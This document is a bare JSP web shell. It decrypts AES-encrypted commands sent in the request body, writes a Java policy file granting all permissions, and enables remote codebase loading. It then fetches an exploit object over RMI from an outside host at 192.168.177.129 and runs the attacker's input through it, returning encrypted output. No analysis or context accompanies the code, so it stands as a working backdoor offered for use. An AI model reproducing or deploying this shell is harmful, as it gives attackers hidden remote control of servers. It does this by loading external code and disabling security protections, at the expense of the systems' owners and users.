<%@ page import="java.rmi.RMISecurityManager" %>
<%@ page import="java.rmi.Naming" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="javax.crypto.SecretKey" %>
<%@ page import="java.security.spec.AlgorithmParameterSpec" %>
<%@ page import="javax.crypto.spec.IvParameterSpec" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileWriter" %>
<%@ page import="java.io.BufferedWriter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public static String encrypt(final String plaintext) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
            byte[] result = cipher.doFinal(plaintext.getBytes("UTF-8"));
            return new sun.misc.BASE64Encoder().encode(result).replaceAll("\r|\n|\r\n", "");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String decrypt(final String encrypted) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            byte[] decodeBase64 = new sun.misc.BASE64Decoder().decodeBuffer(encrypted);
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
            return new String(cipher.doFinal(decodeBase64), "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
%>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
    br.close();

    if(wholeStr != null && !wholeStr.trim().equals("")) {
        wholeStr = decrypt(wholeStr.substring(0,wholeStr.length()-1));
        try {
            File file = new File("security.policy");
            if(!file.exists()){
                file.createNewFile();
                FileWriter fileWritter = new FileWriter(file.getName(),true);
                BufferedWriter bufferWritter = new BufferedWriter(fileWritter);
                bufferWritter.write("grant {\n" +
                        "    permission java.security.AllPermission;\n" +
                        "};");
                bufferWritter.close();
            }
            System.setProperty("java.security.policy","security.policy");
            System.setProperty("java.rmi.server.useCodebaseOnly","false");
            System.setSecurityManager(new RMISecurityManager());

            Object object = Naming.lookup("rmi://192.168.177.129:1099/Object");
            Method method = object.getClass().getMethod("getExploit", null);
            Object obj = method.invoke(object);
            method = obj.getClass().getMethod("run", String.class);
            response.getWriter().print(encrypt((String)method.invoke(obj, wholeStr)));
        } catch (Exception e){
            e.printStackTrace();
        }
    }
%>
